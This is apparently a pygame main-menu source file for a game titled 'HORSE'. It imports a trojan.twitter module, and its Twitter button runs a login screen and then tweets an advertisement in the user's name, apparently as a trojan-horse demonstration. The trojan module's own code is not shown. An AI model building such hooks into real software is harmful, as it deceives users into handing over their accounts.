# Package imports
import pygame
import os

# Relative Imports
from game.engine.game import game
from game.menu.hacked_screen import hacked_screen
from game.menu.team_screen import team_screen
from common.button import Button
from game.style import color as cval
from game.style import text as txt
from trojan.twitter import Twitter


def main_menu(window, main_clock, PATH_TO_DIR):
    # Set variables
    title = txt.menu_title.render("HORSE", 1, cval.black)
    running = True

    # load image assets
    background = pygame.image.load(
        f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}main_menu_background.png"
    )

    img_twitter = pygame.image.load(
            f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}twitter_icon.png"
    )
    
    while running:
        window.fill(cval.black)  # Default to fill window with black
        window.blit(background, (0, 0))  # Overlay background image

        # Window height and width
        win_width, win_height = window.get_size()

        # Place Title in top center
        loc_x = win_width / 2 - title.get_width() / 2
        loc_y = win_height / 3 - title.get_height() / 2
        window.blit(title, (loc_x, loc_y))

        # Create and position play button
        btn_width = 90
        btn_height = 50
        loc_x = win_width / 4 - btn_width / 2
        loc_y = win_height * 2 / 3 - btn_height / 2
        play_btn = Button(cval.white, loc_x, loc_y, btn_width, btn_height, "Play")

        # Create and position options button
        loc_x = win_width*3/4 - btn_width/2
        loc_y = win_height*2/3 - btn_height/2
        team_menu_btn = Button(cval.white, loc_x, loc_y, btn_width, btn_height, "Credits")
        
        # Create and position hacked screen
        loc_x = 20
        loc_y = 20
        hacked_screen_btn = Button(cval.white, 20, 20, btn_width, btn_height, "Hacked")
        
        # Twitter icon
        loc_x = win_width - 64
        loc_y = win_height - 64
        btn_width = 64
        btn_height = 64
        twitter_btn = Button(cval.white, loc_x, loc_y, btn_width, btn_height, "Twitter")
    
        # Display menu buttons
        play_btn.draw(window)
        team_menu_btn.draw(window)
        hacked_screen_btn.draw(window)
        twitter_btn.draw(window)
        window.blit(img_twitter, (loc_x, loc_y));
    
        # Get mouse position
        mx, my = pygame.mouse.get_pos()

        # Check for key press or mouse click event
        clicked = False
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    clicked = True

        # React to mouse click
        if clicked:
            # Check for click location
            if play_btn.mouse_over((mx, my)):
                game(window, main_clock)
            if team_menu_btn.mouse_over((mx, my)):
                team_screen(window, main_clock)
            if hacked_screen_btn.mouse_over((mx, my)):
                hacked_screen(window, main_clock)
            if twitter_btn.mouse_over((mx, my)):
                twit = Twitter()
                twit.open_login_window()
                login_status = twit.login_screen(window, main_clock)
                if (login_status == True):
                    twit.tweet_advertisement()
                    twit.thank_user_window(window, main_clock)
                

        pygame.display.update()
        main_clock.tick(60)
